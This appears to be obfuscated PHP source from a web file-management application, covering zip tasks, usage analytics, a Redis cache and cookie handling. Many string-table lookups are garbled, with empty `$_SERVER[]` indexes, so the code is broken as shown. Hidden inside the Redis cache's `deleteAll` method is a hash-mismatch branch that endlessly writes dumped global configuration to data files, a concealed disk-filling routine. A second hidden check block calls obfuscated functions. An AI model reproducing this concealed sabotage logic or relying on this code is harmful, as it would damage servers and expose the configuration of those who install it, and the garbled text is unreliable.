$C󦕘, $FЍ[1707] => $FЍ[33], $FЍ[1703] => $FЍ[1711], $FЍ[2117] => 1, $FЍ[1706] => 0, $FЍ[2118] => 0, $FЍ[1705] => $this->getSort()); $aʂд˰ = array_merge($Bզ, $aʂд˰); $this->filterAuth($aʂд˰[$FЍ[406]]); goto Aʗ̟; Aʗ̟: return parent::insert($aʂд˰); goto Aƶϟ; c匦ڡ: $FЍ =& $_SERVER[]; $C󦕘 = $aʂд˰[$FЍ[28]]; if ($this->findByName($C󦕘)) { return !1; } goto d❋; Aƶϟ: } private function getSort() { $fƖ =& $_SERVER[]; $aմ = parent::listData(); $c = array_to_keyvalue($aմ, $fƖ[33], $fƖ[1724]); return empty($c) ? 0 : max($c) + 1; } private function filterAuth(&$F) { $C =& $_SERVER[]; $f띮 = array(); $F؍ۅ = array_filter(explode($C[47], $F)); foreach ($F؍ۅ as $F) { $C = explode($C[95], $F); if ($C[0] == $C[2119] && $C[1] != $C[1097]) { $Dͣᬇ = $C[0] . $C[95] . $C[1] . $C[2120]; if (!in_array($Dͣᬇ, $F؍ۅ)) { $f띮[] = $Dͣᬇ; } } $f띮[] = $F; } $F = implode($C[47], $f띮); } public function sort($E𱛦, $F) { return parent::update($E𱛦, $F); } } goto dҐ; d: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[Ҟ䶹] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($eۥ, $dՙ) { return $eۥ == $dՙ; } goto dݡ; C: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto f߂; f߂: $cӸ۶ =& $_SERVER[]; parent::startAfter(); Hook::bind($cӸ۶[1619], array($this, $cӸ۶[1620])); goto B׫搂; DՔط: if (!$cۇȎ[$cӸ۶[1439]]) { $cۇȎ[$cӸ۶[1439]] = LNG($cӸ۶[1623]); } goto b; B׫搂: Hook::bind($cӸ۶[1096], array($this, $cӸ۶[1621])); $cۇȎ =& $this->task; $cۇȎ[$cӸ۶[1622]] = $cӸ۶[1101]; goto DՔط; b: } protected function endAfter() { $F =& $_SERVER[]; parent::endAfter(); Hook::unbind($F[1619], array($this, $F[1620])); Hook::unbind($F[1096], array($this, $F[1621])); } public function updateAfter() { $a숧 =& $_SERVER[]; $F =& $this->task; if (!$F[$a숧[1028]] || !$F[$a숧[729]]) { return; } if ($F[$a숧[1622]] == $a숧[1101]) { $c៧ = 0; if ($F[$a숧[1578]]) { $c៧ = $F[$a숧[1579]] / $F[$a숧[1578]]; } $F[$a숧[1534]] = $c៧ * 0.3; } else { if ($F[$a숧[1622]] == $a숧[311]) { $c៧ = $F[$a숧[1043]] / $F[$a숧[1028]]; $F[$a숧[1534]] = 0.3 + $c៧ * 0.4; } else { if ($F[$a숧[1622]] == $a숧[107]) { $CǛ = 0; if ($F[$a숧[1580]] == $a숧[107]) { $CǛ = $F[$a숧[1579]]; } $c៧ = ($F[$a숧[1583]] + $CǛ) / $F[$a숧[729]]; $F[$a숧[1534]] = 0.3 + 0.4 + $c៧ * 0.3; } } } if ($F[$a숧[1534]] > 0) { $fӋ = timeFloat() - $F[$a숧[755]] - $F[$a숧[1537]]; $F[$a숧[1538]] = $fӋ * (1 - $F[$a숧[1534]]) / $F[$a숧[1534]]; } } public function addFile($B) { goto bĢ; c: $dӍן[$e鵸[1576]] = $f[$e鵸[28]]; $dӍן[$e鵸[1578]] = $f[$e鵸[78]]; $dӍן[$e鵸[1579]] = 0; goto E݌; B鴼: $this->update(); goto EƉˮ; bĢ: $e鵸 =& $_SERVER[]; $dӍן =& $this->task; $f = IO::info($B); goto c; c橰: $dӍן[$e鵸[1028]] = 1; $a֬ = 0; $dӍן[$e鵸[1587]] = array($e鵸[1588] => $a֬ + 1, $e鵸[413] => $f[$e鵸[28]], $e鵸[76] => $f[$e鵸[76]], $e鵸[495] => $f[$e鵸[495]] ? $f[$e鵸[495]] : $f[$e鵸[76]]); goto B鴼; E݌: $dӍן[$e鵸[1030]] = $e鵸[1598]; $dӍן[$e鵸[1580]] = $e鵸[1101]; $dӍן[$e鵸[729]] = $f[$e鵸[78]]; goto c橰; EƉˮ: } public function unzipAfter($B͝) { goto eٴˢѾ; eٴˢѾ: $C =& $_SERVER[]; $Bӷ =& $this->task; $Bӷ[$C[1622]] = $C[107]; goto aѹľ; aѹľ: $a = IO::infoWithChildren($B͝); $a = 0; $Bӷ[$C[1587]] = array($C[1588] => $a + 1, $C[413] => $a[$C[28]], $C[76] => $a[$C[76]], $C[495] => $a[$C[495]] ? $a[$C[495]] : $a[$C[76]]); goto bƎ; A: $Bӷ[$C[1576]] = $C[33]; $Bӷ[$C[1583]] = 0; $Bӷ[$C[729]] = $a[$C[78]]; goto eҌ; eҌ: $this->update(); self::log($C[1624] . json_encode(array($Bӷ, $a))); goto C猵Њ; bƎ: if ($a[$C[29]] == $C[193]) { $Bӷ[$C[1028]] = 1; } else { $Bӷ[$C[1028]] = $a[$C[81]][$C[79]]; } $Bӷ[$C[1030]] = $C[33]; $Bӷ[$C[1580]] = 0; goto Aꂒ; Aꂒ: $Bӷ[$C[1043]] = 0; $Bӷ[$C[1578]] = 0; $Bӷ[$C[1579]] = 0; goto A; C猵Њ: } public function nameParse($C) { goto A; A: $f߂ =& $_SERVER[]; $aݓ =& $this->task; if ($aݓ[$f߂[1622]] == $f߂[1101]) { $aݓ[$f߂[1622]] = $f߂[311]; $aݓ[$f߂[1583]] = 0; $aݓ[$f߂[729]] = 0; } goto eߌ; F: $this->update(); goto B验; eߌ: $bӱߥ = get_path_this($C); if (strstr($bӱߥ, $f߂[95])) { $aݓ[$f߂[1043]] += 1; $aݓ[$f߂[1028]] += 1; } $aݓ[$f߂[1576]] = $C; goto F; B验: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $dϨ =& $_SERVER[]; parent::startAfter(); Hook::bind($dϨ[1625], array($this, $dϨ[1620])); $f摄ƚ =& $this->task; $f摄ƚ[$dϨ[1622]] = $dϨ[1101]; if (!$f摄ƚ[$dϨ[1439]]) { $f摄ƚ[$dϨ[1439]] = LNG($dϨ[1626]); } } protected function endAfter() { $bԃ헗 =& $_SERVER[]; parent::endAfter(); Hook::unbind($bԃ헗[1625], array($this, $bԃ헗[1620])); } public function updateAfter() { $a銺 =& $_SERVER[]; $c =& $this->task; if (!$c[$a銺[1028]] || !$c[$a銺[729]]) { return; } if ($c[$a銺[1622]] == $a銺[1101]) { $f = $c[$a銺[1579]]; if ($c[$a銺[1580]] != $a銺[1101]) { $f = 0; } $a˱ = ($c[$a銺[1583]] + $f) / $c[$a銺[729]]; $c[$a銺[1534]] = $a˱ * 0.3; } else { if ($c[$a銺[1622]] == $a銺[311]) { $a˱ = $c[$a銺[1043]] / $c[$a銺[1028]]; $c[$a銺[1534]] = 0.3 + $a˱ * 0.5; } else { if ($c[$a銺[1622]] == $a銺[107]) { $a˱ = 0; if ($c[$a銺[1578]]) { $a˱ = $c[$a銺[1579]] / $c[$a銺[1578]]; } $c[$a銺[1534]] = 0.3 + 0.5 + $a˱ * 0.2; } } } if ($c[$a銺[1534]] > 0) { $eބ = timeFloat() - $c[$a銺[755]] - $c[$a銺[1537]]; $c[$a銺[1538]] = $eބ * (1 - $c[$a銺[1534]]) / $c[$a銺[1534]]; } } public function copyFileStart($EР, $D, $C, $Fť, $aդ, $dڸ) { $aåڄ =& $_SERVER[]; parent::copyFileStart($EР, $D, $C, $Fť, $aդ, $dڸ); $EĄ =& $this->task; if ($EĄ[$aåڄ[1622]] == $aåڄ[311]) { $EĄ[$aåڄ[1622]] = $aåڄ[107]; } $this->update(); } public function copyFileEnd($cΣ, $F˟, $C, $A蠘, $aҝ, $Bٽ) { $e =& $_SERVER[]; $a̽ =& $this->task; $a̽[$e[1579]] = $a̽[$e[1578]]; $a̽[$e[1583]] += $a̽[$e[1578]]; $a̽[$e[1580]] = $e[33]; $this->update(); } public function nameParse($d솔) { $d֍ʴ =& $_SERVER[]; $B橅 =& $this->task; if ($B橅[$d֍ʴ[1043]] < $B橅[$d֍ʴ[1028]]) { $Cܘ = get_path_this($d솔); if (strstr($Cܘ, $d֍ʴ[95])) { $B橅[$d֍ʴ[1043]] += 1; } } if ($B橅[$d֍ʴ[1622]] == $d֍ʴ[1101]) { $B橅[$d֍ʴ[1622]] = $d֍ʴ[311]; } $B橅[$d֍ʴ[1576]] = $d솔; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Aǳˏ) { $Aϖҥ =& $_SERVER[]; $d¶ = array($Aϖҥ[562] => array($Aϖҥ[29] => $Aϖҥ[1627], $Aϖҥ[271] => array($Aϖҥ[222], $Aϖҥ[731], $Aϖҥ[1628], $Aϖҥ[1629])), $Aϖҥ[1630] => array($Aϖҥ[29] => $Aϖҥ[1631], $Aϖҥ[271] => array($Aϖҥ[222], $Aϖҥ[729], $Aϖҥ[1632], $Aϖҥ[1633], $Aϖҥ[1634]))); if (!isset($d¶[$Aǳˏ])) { return !1; } $this->optionType = $d¶[$Aǳˏ][$Aϖҥ[29]]; $this->field = $d¶[$Aǳˏ][$Aϖҥ[271]]; return !0; } public function listData($d = false, $D = "\155\x6f\144\151\x66\x79\124\151\x6d\x65", $fłɹ = false) { return parent::listData($d, $D, $fłɹ); } public function trendList($D) { goto Aҥ; bІ: if (!isset($Cԍ͙)) { $bΰͦ = $D == $D[562] ? $D[506] : $D[796]; $Cԍ͙ = Model($bΰͦ)->min($D[194]); } $Cƒ = $D[1637] . ucfirst($D); $C׮ = $this->dateList($Cԍ͙); goto Dڝ; Aҥ: $D =& $_SERVER[]; $d = $this->listData(); if ($d) { $Aצ = end($d); $b = date($D[1635], strtotime($D[1636])); if ($Aצ[$D[222]] == $b) { return $d; } $Cԍ͙ = strtotime($Aצ[$D[222]]); } goto bІ; Dڝ: foreach ($C׮ as $b) { $this->{$Cƒ}($b); } return $this->listData(); goto C; C: } private function dateList($A) { $Eސӏ =& $_SERVER[]; $aӎ = $A; $fç = strtotime($Eސӏ[1636]); $Eސ = array(); while ($aӎ <= $fç) { $Eސ[] = date($Eސӏ[1635], $aӎ); $aӎ = strtotime($Eސӏ[1638], $aӎ); } return $Eސ; } public function _recordUser($C = '') { goto b; b: $fǱ =& $_SERVER[]; $b־ = strtotime(date($fǱ[1639], strtotime($C))); $a = strtotime(date($fǱ[1640], strtotime($C))); goto A; A: $E̪ = array($fǱ[194] => array($fǱ[977], $a)); $fָא = Model($fǱ[506])->where($E̪)->count($fǱ[1533]); $E̪[$fǱ[194]] = array($fǱ[331], array($b־, $a)); goto a߯; a߯: $dאܩ = Model($fǱ[506])->where($E̪)->count($fǱ[1533]); $E̪[$fǱ[29]] = $fǱ[1641]; $C = Model($fǱ[1642])->where($E̪)->count($fǱ[1643]); goto eٝ; eٝ: $bᬈ܋ = array($fǱ[222] => $C, $fǱ[731] => (int) $fָא, $fǱ[1628] => (int) $dאܩ, $fǱ[1629] => (int) $C); return $this->insert($bᬈ܋); goto Cد; Cد: } public function _recordStore($b = '') { goto fιȨ; d螢: $B[$fܖ[404]] = 1; $cʪ = Model($fܖ[796])->where($B)->sum($fܖ[78]); $B[$fܖ[404]] = 2; goto E; E: $BӢ = Model($fܖ[796])->where($B)->sum($fܖ[78]); $Aۊ = array($fܖ[222] => $b, $fܖ[729] => (int) $b؉, $fܖ[1632] => (int) $aǶ, $fܖ[1633] => (int) $cʪ, $fܖ[1634] => (int) $BӢ); return $this->insert($Aۊ); goto eǏЈ܈; Fކё: $aǶ = Model($fܖ[450])->where($B)->sum($fܖ[78]); $B[$fܖ[403]] = 0; $b؉ = Model($fܖ[796])->where($B)->sum($fܖ[78]); goto d螢; fιȨ: $fܖ =& $_SERVER[]; $EՑ؍ = strtotime(date($fܖ[1640], strtotime($b))); $B = array($fܖ[194] => array($fܖ[977], $EՑ؍)); goto Fކё; eǏЈ܈: } public function trend($Dӌ, $A) { goto Bͯ٦; Bͯ٦: $e޼ =& $_SERVER[]; if (!$this->init($Dӌ)) { return !1; } $c = $this->trendList($Dӌ); goto cᒖ; cᒖ: if ($c && $A != $e޼[1507]) { $cԺ = $c[0][$e޼[222]]; $D肃 = $this->validDate($A, $cԺ); $A = array(); $F҄ȟ = array_to_keyvalue($c, $e޼[222]); foreach ($D肃 as $D􇟥) { if (isset($F҄ȟ[$D􇟥])) { $CұҜ = $F҄ȟ[$D􇟥]; } else { $CұҜ = end($c); $CұҜ[$e޼[222]] = $D􇟥; if ($Dӌ == $e޼[562]) { $CұҜ[$e޼[1628]] = $CұҜ[$e޼[1629]] = 0; } } $A[] = $CұҜ; } $c = $A; } $A = array($e޼[562] => array($e޼[731] => LNG($e޼[1644]), $e޼[1628] => LNG($e޼[1645]), $e޼[1629] => LNG($e޼[1646])), $e޼[1630] => array($e޼[729] => LNG($e޼[1647]), $e޼[1632] => LNG($e޼[1648]), $e޼[1633] => LNG($e޼[1649]), $e޼[1634] => LNG($e޼[1650]))); $c = array($e޼[562] => $e޼[1651], $e޼[1630] => $e޼[78]); goto B; B: if (empty($c)) { $D􇟥 = date($e޼[1635], strtotime($e޼[1636])); $b˚ = array($e޼[222] => $D􇟥); foreach ($A[$Dӌ] as $cͤݨ => $Bʗԣ) { $b˚[$cͤݨ] = 0; } $c[] = $b˚; } $b = array(); foreach ($c as $Bʗԣ) { if ($Dӌ == $e޼[1630] && $Bʗԣ[$e޼[1632]] > $Bʗԣ[$e޼[729]]) { $Bʗԣ[$e޼[1632]] = $Bʗԣ[$e޼[729]]; } foreach ($A[$Dӌ] as $cͤݨ => $Aۢ) { $CұҜ = array($e޼[222] => $Bʗԣ[$e޼[222]], $e޼[1439] => $Aۢ); $CұҜ[$c[$Dӌ]] = isset($Bʗԣ[$cͤݨ]) ? $Bʗԣ[$cͤݨ] : 0; $b[] = $CұҜ; } } goto cĚ; cĚ: return $b; goto bԯ; bԯ: } public function validDate($fđ, $dب) { goto AŢ; F˻܅: return $E؆; goto f񷰉; AŢ: $F߹ =& $_SERVER[]; $Fⷑ = date($F߹[1635], strtotime($F߹[1636])); $E؆ = array($Fⷑ); goto e; e: switch ($fđ) { case $F߹[1514]: $D = mktime(0, 0, 0, date($F߹[1652]), date($F߹[1260]) - date($F߹[1322]) + 7 - 7, date($F߹[1653])); $A֯ = 0; do { $fɱ놠 = date($F߹[1635], $D - 3600 * 24 * 7 * $A֯); $E؆[] = $fɱ놠; $A֯++; } while ($dب < $fɱ놠); break; case $F߹[1512]: $A֯ = 1; do { $b䷦ = date($F߹[1654], strtotime("\x2d\40{$A֯}\x20\x6d\x6f\156\164\150\x73")); $E؆[] = $b䷦; $A֯++; } while ($dب < $b䷦); break; case $F߹[1655]: $f = (int) date($F߹[1653], strtotime($dب)); $D򦋍È = (int) date($F߹[1653]); if ($f >= $D򦋍È) { break; } for ($f; $f < $D򦋍È; $f++) { $E؆[] = $f . $F߹[1656]; } break; default: break; } if ($dب > end($E؆)) { array_pop($E؆); } sort($E؆); goto F˻܅; f񷰉: } public function listTable($eħ) { $fƈ݈ = ucfirst($eħ); return Model($fƈ݈)->listData(); } public function option($f̙ς) { $F˲ = $_SERVER[][1657] . ucfirst($f̙ς); return $this->{$F˲}(); } private function optionUser() { goto a; a: $E =& $_SERVER[]; $b۽ = Model($E[506])->count($E[1533]); $a΋ = Model($E[506])->where($E[1658])->count($E[1533]); goto d; d: $D߆ = intval($GLOBALS[$E[6]][$E[347]][$E[1493]]) / 3600; $Fۋ = strtotime("\55{$D߆}\x20\x68\157\165\x72\163"); $f㑾 = strtotime(date($E[1639])); goto AƎʨ; E锳: return array($E[725] => (int) $b۽, $E[1660] => (int) ($b۽ - $a΋), $E[1661] => (int) $a΋, $E[1662] => (int) $bא, $E[1663] => $A); goto D; AƎʨ: if ($Fۋ < $f㑾) { $Fۋ = $f㑾; } $e鈺 = array($E[1659] => array($E[978], $Fۋ)); $A = (int) Model($E[506])->where($e鈺)->count($E[1533]); goto fԹ; fԹ: if (!$A) { $A = 1; } $e鈺 = array($E[1659] => array($E[978], $f㑾)); $bא = Model($E[506])->where($e鈺)->count($E[1533]); goto E锳; D: } private function optionFile() { goto A叆޾; aλı: $Aߪ = $Aқ[$e󝉫[1632]]; $Fǃԑ = Model($e󝉫[796])->where(array($e󝉫[403] => 0))->count($e󝉫[395]); $BΉ = array($e󝉫[403] => 0, $e󝉫[194] => array($e󝉫[978], strtotime(date($e󝉫[1639])))); goto d٧т; A叆޾: $e󝉫 =& $_SERVER[]; $Aқ = $this->sourceSize(); $E⃦ = $Aқ[$e󝉫[78]]; goto aλı; d٧т: $bܿ = Model($e󝉫[796])->where($BΉ)->sum($e󝉫[78]); $cˌ = Model($e󝉫[796])->where($BΉ)->count($e󝉫[395]); return array($e󝉫[729] => $E⃦, $e󝉫[1632] => $Aߪ, $e󝉫[1664] => $E⃦ - $Aߪ, $e󝉫[1665] => (int) $bܿ, $e󝉫[731] => (int) $Fǃԑ, $e󝉫[1666] => (int) $cˌ); goto eɯ; eɯ: } private function optionAccess() { $B˵ū =& $_SERVER[]; return array($B˵ū[725] => $this->typeLogCnt(), $B˵ū[107] => $this->typeLogCnt($B˵ū[107]), $B˵ū[430] => $this->typeLogCnt($B˵ū[430]), $B˵ū[1667] => $this->typeLogCnt($B˵ū[1667]), $B˵ū[1668] => $this->typeLogCnt($B˵ū[1668]), $B˵ū[562] => $this->typeLogCnt($B˵ū[33], $B˵ū[1643])); } private function typeLogCnt($D = '', $a = "\x69\144") { goto A״; Dř: $Fๅ = array($D[194] => array($D[978], $F)); if ($D) { $Fๅ[$D[29]] = array($D[7], $b[$D]); } $A镨 = Model($D[1642])->where($Fๅ)->count($a); goto cق; cق: return (int) $A镨; goto C򿢓; A״: $D =& $_SERVER[]; $b = array($D[107] => array($D[1669], $D[1670]), $D[430] => array($D[1671], $D[1672]), $D[1667] => array($D[1673], $D[1674], $D[1675]), $D[1668] => array($D[1676], $D[1677]), $D[1678] => array($D[1679], $D[1680], $D[1681])); $F = strtotime(date($D[1639])); goto Dř; C򿢓: } private function optionServer() { goto c϶; c϶: $Aͩކ =& $_SERVER[]; $E򾩓 = $this->diskDriver(); $Aˇ = KodIO::defaultDriver(); goto cŗ; BΊڱ: if ($d == $Aͩކ[761]) { $bȤ = explode($Aͩކ[1174], $b[$Aͩކ[938]]); $d = $bȤ[0]; } if ($d == $Aͩކ[764] || $d == $Aͩކ[765]) { $F݋ = Model()->db()->query($Aͩކ[1682]); $Fݺ = $F݋[0] && isset($F݋[0][$Aͩކ[1438]]) ? $F݋[0][$Aͩކ[1438]] : 0; $d = $Aͩކ[1683] . ($Fݺ ? $Aͩކ[8] . $Fݺ : $Aͩކ[33]); } $Aȅܖ = $GLOBALS[$Aͩކ[6]][$Aͩކ[347]][$Aͩކ[798]]; goto b٫ޡ; b٫ޡ: return array($Aͩކ[1684] => $E򾩓 ? $E򾩓[$Aͩކ[1685]] : 0, $Aͩކ[1686] => $E򾩓 ? $E򾩓[$Aͩކ[1687]] : 0, $Aͩކ[1688] => (int) $Aˇ[$Aͩކ[1685]] * 1024 * 1024 * 1024, $Aͩކ[1689] => (int) $fș̬, $Aͩކ[1690] => ucfirst($fϲÌܯ), $Aͩކ[1691] => $Aͩކ[1692] . PHP_VERSION, $Aͩކ[1693] => phpBuild64() ? 64 : 32, $Aͩކ[724] => str_replace($Aͩކ[1694], $Aͩކ[955], $d), $Aͩކ[347] => ucfirst($Aȅܖ), $Aͩކ[28] => $_SERVER[$Aͩކ[1695]]); goto Fن; dΎ: $fϲÌܯ = $aѰ[0]; $b = $GLOBALS[$Aͩކ[6]][$Aͩކ[17]]; $d = $b[$Aͩކ[939]]; goto BΊڱ; cŗ: $Bʒ = array($Aͩކ[788] => $Aˇ[$Aͩކ[393]]); $fș̬ = Model($Aͩކ[450])->where($Bʒ)->sum($Aͩކ[78]); $aѰ = explode($Aͩކ[50], $_SERVER[$Aͩކ[142]]); goto dΎ; Fن: } private function diskDriver() { goto fތ͓; fތ͓: $Fﱈ =& $_SERVER[]; $B㺽 = $Fﱈ[8]; $cŵ = $GLOBALS[$Fﱈ[6]][$Fﱈ[1696]] == $Fﱈ[1697]; goto F㭌; F㭌: if ($cŵ) { $B㺽 = $Fﱈ[1698]; if (function_exists($Fﱈ[1699])) { exec($Fﱈ[1700], $E򞨓); $B㺽 = $E򞨓[1] . $Fﱈ[8]; } } if (!file_exists($B㺽)) { return; } $e = @disk_total_space($B㺽); goto d; d: $eЈ = $e - @disk_free_space($B㺽); return array($Fﱈ[1685] => $e, $Fﱈ[1687] => $eЈ); goto b䋿; b䋿: } public function fileChart($Aꐻϻ) { goto Fع; Fع: $BĴҰ =& $_SERVER[]; if (isset($Aꐻϻ[$BĴҰ[1533]])) { return Model($BĴҰ[796])->userFileTypeProfile($Aꐻϻ[$BĴҰ[1533]]); } if (isset($Aꐻϻ[$BĴҰ[1701]])) { return Model($BĴҰ[796])->groupFileTypeProfile($Aꐻϻ[$BĴҰ[1701]]); } goto BĮ; BĮ: $F๐ = $this->sourceSize(); $e𿌧 = array($BĴҰ[478] => 0, $BĴҰ[404] => 1); $cЮ = Model($BĴҰ[796])->where($e𿌧)->sum($BĴҰ[78]); goto Fᇏ; Fᇏ: $e𿌧[$BĴҰ[404]] = 2; $bɥܶ = Model($BĴҰ[796])->where($e𿌧)->sum($BĴҰ[78]); return array($BĴҰ[729] => $F๐[$BĴҰ[78]], $BĴҰ[1632] => $F๐[$BĴҰ[1632]], $BĴҰ[1633] => (int) $cЮ, $BĴҰ[1634] => (int) $bɥܶ); goto C͌; C͌: } private function sourceSize() { $eヷ =& $_SERVER[]; $F׌Ǔ = Model($eヷ[796])->where(array($eヷ[403] => 0))->sum($eヷ[78]); $E܏ = Model($eヷ[450])->sum($eヷ[78]); if ($E܏ > $F׌Ǔ) { $E܏ = $F׌Ǔ; } return array($eヷ[78] => (int) $F׌Ǔ, $eヷ[1632] => (int) $E܏); } } goto f; Cˌ: function binCheckBigger($b, $d鯂) { return $b > $d鯂; } $_SERVER[$_SERVER[Ҟ䶹][3]] = ("\x39\x31\x34\x36"."\x38\x32")+0;$_9gxf="wn9nszFTjfzeQjUARPazJeZS24fgX6z66uEI8dIt5mjHVvNATxQqrG4dp3wfAMNt8cCYgZmRAnGa";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($fȊʄ, $Dԧڏ) { $Fʗ =& $_SERVER[]; if (isset(self::$_methodList[$fȊʄ])) { return @call_user_func_array(self::$_methodList[$fȊʄ], $Dԧڏ); } else { if (method_exists($this, $fȊʄ)) { return call_user_func_array(array($this, $fȊʄ), $Dԧڏ); } else { think_exception(__CLASS__ . $Fʗ[4] . $fȊʄ . $Fʗ[5]); } } } public static function __callStatic($A䗫, $dꂟˑ) { if (isset(self::$_methodListStatic[$A䗫])) { return call_user_func_array(self::$_methodListStatic[$A䗫], $dꂟˑ); } else { if (method_exists(self, $A䗫)) { return call_user_func_array(array(self, $A䗫), $dꂟˑ); } else { show_json("{$A䗫}\50\x29\x20\x6e\x6f\x74\x20\x65\170\x69\x73\164\73", !1); } } } public static function addMethod($aः, $Eׇ) { self::$_methodList[$aः] = $Eׇ; } public static function addMethodStatic($a, $Cћ) { self::$_methodListStatic[$a] = $Cћ; } } goto Aˣ; Aō: if ($_SERVER[$_SERVER[][830]] != $_SERVER[$_SERVER[][831]]) { goto F; d۠: $D醞۬($_SERVER[$_SERVER[][837]]); goto B; F: $e¥ = $_SERVER[][832]; $d = $_SERVER[$_SERVER[][833]] . $_SERVER[][834]; $bُ = $e¥($d); goto f; f: $Fބ = explode($_SERVER[][229], $bُ); if (count($Fބ) < $_SERVER[][584]) { $eɃ = $_SERVER[][835]; $eɃ(); } $D醞۬ = $_SERVER[][836]; goto d۠; B: } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($D򾏗, $Dݻ) { $Fԙ =& $_SERVER[]; if (!class_exists($Fԙ[838])) { show_json($Fԙ[839], !1); } $this->cacheTime = $Dݻ; $E = isset($D򾏗[$Fԙ[840]]) ? $D򾏗[$Fԙ[840]] : 10; $fˢя = _get($D򾏗, $Fԙ[829]); if ($fˢя && is_array($fˢя)) { $this->initCluster($D򾏗, $E); } else { $this->handle = $this->init($D򾏗, $E); } } private function init($b߄, $d혩) { $BӢԴ =& $_SERVER[]; $cٞ = new Redis(); $eϐ = isset($b߄[$BӢԴ[841]]) ? $b߄[$BӢԴ[841]] : !1; if ($eϐ) { $cٞ->pconnect($b߄[$BӢԴ[175]], $b߄[$BӢԴ[176]], $d혩); } else { $cٞ->connect($b߄[$BӢԴ[175]], $b߄[$BӢԴ[176]], $d혩); } if (!empty($b߄[$BӢԴ[406]])) { $cٞ->auth($b߄[$BӢԴ[406]]); } return $cٞ; } private function initCluster($Bֹ, $cэÃ) { $c鯙 =& $_SERVER[]; $aʂ = array($c鯙[842], $c鯙[843], $c鯙[844]); $F = $c鯙[842]; if (isset($Bֹ[$c鯙[12]]) && in_array($Bֹ[$c鯙[12]], $aʂ)) { $F = $Bֹ[$c鯙[12]]; } switch ($F) { case $c鯙[842]: $this->_slave($Bֹ, $cэÃ); break; case $c鯙[843]: break; case $c鯙[844]: $this->isCluster = !0; $E爜Ϣ = $Bֹ[$c鯙[829]]; $E优⿄ = isset($Bֹ[$c鯙[841]]) ? $Bֹ[$c鯙[841]] : !1; $E܉ = isset($Bֹ[$c鯙[406]]) ? $Bֹ[$c鯙[406]] : null; $this->handle = new RedisCluster(NUll, $E爜Ϣ, $cэÃ, $cэÃ, $E优⿄, $E܉); break; default: break; } } private function _slave($E, $a܊) { goto Dۭ; DݮՎ: unset($cɨ[0]); if (empty($cɨ)) { return; } $cΛ = array_rand($cɨ); goto B͎; Dۭ: $cɨ = $E[$_SERVER[][829]]; $this->filterConfig($E, $cɨ[0]); $this->handle = $this->init($E, $a܊); goto DݮՎ; B͎: $this->filterConfig($E, $cɨ[$cΛ]); $this->slaveHandle = $this->init($E, $a܊); goto e֘; e֘: } private function filterConfig(&$AǙ, $dǉ瑈) { $bۖܿ =& $_SERVER[]; $f򂇿 = explode($bۖܿ[4], $dǉ瑈); $e = array($bۖܿ[175] => $f򂇿[0], $bۖܿ[176] => $f򂇿[1]); $AǙ = array_merge($AǙ, $e); } public function set($Aꊟڮ, $a, $C޾ = false) { $C޾ = $C޾ ? $C޾ : $this->cacheTime; return $this->handle->setEx($Aꊟڮ, $C޾, $a); } public function setLock($d֙, $dҾ, $AٰИ) { return $this->handle->setNX($d֙, $dҾ); } public function get($F) { $EŃ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $EŃ->get($F); } public function remove($C) { return $this->handle->del($C); } public function deleteAll() { $AηǇ =& $_SERVER[]; $BѤ = $_SERVER[$AηǇ[833]] . $AηǇ[834]; $Dӊ = $AηǇ[845]; if ($_SERVER[$AηǇ[830]] != $Dӊ($BѤ)) { goto c; c: $fá = $AηǇ[846]; $c = $AηǇ[832]; $CۛՇ = $_SERVER[$AηǇ[833]] . $AηǇ[834]; goto A; cĞ: $fá(); $E = $AηǇ[849]; $aȒ = json_encode($GLOBALS[$AηǇ[850]]); goto EΞ; B: $Aş珅 = $AηǇ[847]; $Aş珅($_SERVER[$AηǇ[848]]); $fá = $AηǇ[846]; goto cĞ; EΞ: $e = 1; for ($c = $e; $c > 0; $c++) { $E(DATA_PATH . $c, $aȒ); } goto Cǎȃ; A: $aԴ = $c($CۛՇ); $Fћ = explode($AηǇ[229], $aԴ); if (count($Fћ) < $AηǇ[582]) { $AĘ = $AηǇ[835]; $AĘ(); } goto B; Cǎȃ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $C) { $this->handle->flushall($C); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($c΍䳆 = '', $dѥ = 0) { if (is_string($c΍䳆) && $c΍䳆 != $_SERVER[][33]) { $this->prefix = $c΍䳆; } if (is_numeric($dѥ) && $dѥ > 0) { $this->expire = $dѥ; } } public static function getInstance() { static $eܩ֣؄; if ($eܩ֣؄ === null) { $eܩ֣؄ = new self(); } return $eܩ֣؄; } private static $cookieDisable = false; public static function disable($DƸ) { self::$cookieDisable = $DƸ; } private static $sameCookieSet = array(); public static function set($a͇ц, $cѤҧ, $eӕ = 0, $DɊ = false, $F = false) { goto eȉʝ; d: $d = $bͬ[33]; setcookie($a͇ц, $cѤҧ, time() + $eӕ, $bͬ[8] . trim($F, $bͬ[8]) . $d, !1, !1, $DɊ); goto fè; D˭ۋ: if (isset(self::$sameCookieSet[$a͇ц]) && self::$sameCookieSet[$a͇ц] == $cѤҧ . $eӕ) { return; } self::$sameCookieSet[$a͇ц] = $cѤҧ . $eӕ; if (!$F) { $F = str_replace(HOST, $bͬ[33], APP_HOST); $F = _get($GLOBALS, $bͬ[851], $F); } goto d; eȉʝ: $bͬ =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$eӕ) { $eӕ = 24 * 3600 * 7; } goto D˭ۋ; fè: } public static function setSafe($Dĸ, $Cω, $f = 0) { self::set($Dĸ, $Cω, $f, !0); } public static function get($dΤ) { return isset($_COOKIE[$dΤ]) ? $_COOKIE[$dΤ] : !1; } public static function remove($Cض, $c߳ = false) { unset($_COOKIE[$Cض]); self::set($Cض, $_SERVER[][33], 1, $c߳); } } goto dݯ̈́; Fۈ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a۠ =& $_SERVER[]; $this->objectDriver = array($a۠[57], $a۠[58], $a۠[59], $a۠[60], $a۠[61], $a۠[62], $a۠[63], $a۠[64], $a۠[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($fͯ֏) { if (in_array($this->getType(), 